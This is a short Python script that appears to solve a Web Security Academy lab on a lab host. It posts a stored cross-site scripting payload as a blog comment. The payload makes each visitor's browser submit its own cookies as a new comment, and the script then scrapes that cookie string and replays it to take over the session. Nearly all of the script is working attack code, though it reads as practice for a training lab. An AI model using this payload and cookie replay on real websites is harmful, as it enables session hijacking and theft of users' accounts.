import re

import requests
from bs4 import BeautifulSoup

site = 'acd31f671e990c28c0927caa009d00c9.web-security-academy.net'
s = requests.Session()


def try_post(name, website_link):
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    comment_xss = ''''<script>                                                                        
      document.addEventListener("DOMContentLoaded", function() {                      
      document.forms[0].name.value = 'bradlet2';                                           
      document.forms[0].email.value = 'bradlet2@pdx.edu';                                
      document.forms[0].postId.value = 1;                                           
      document.forms[0].csrf.value = document.getElementsByName('csrf')[0].value;   
      document.forms[0].comment.value = document.cookie;                            
      document.forms[0].website.value = 'https://pdx.edu';                          
      document.forms[0].submit();                                                   
    });                                                                             
    </script>'''
    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf': csrf,
        'postId': '1',
        'comment': comment_xss,
        'name': name,
        'email': 'bradlet2@pdx.edu',
        'website': ""
    }
    resp = s.post(comment_url, data=comment_data)


if __name__ == '__main__':
    # try_post("exploit", 'https://foo?&apos;-alert(1)-&apos;')

    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    cookie_list = soup.find('p', text=re.compile('secret')).text.split(';')
    print(cookie_list)
    cookie_dict = dict()
    for cookie in cookie_list:
        c = cookie.split('=')
        cookie_dict[c[0]] = c[1]
    print(cookie_dict)
    resp = s.get(f'https://{site}', cookies=cookie_dict)

# Note overwrote #3 so this is really a combination of it and #6 -- prob won't use any of this anyway
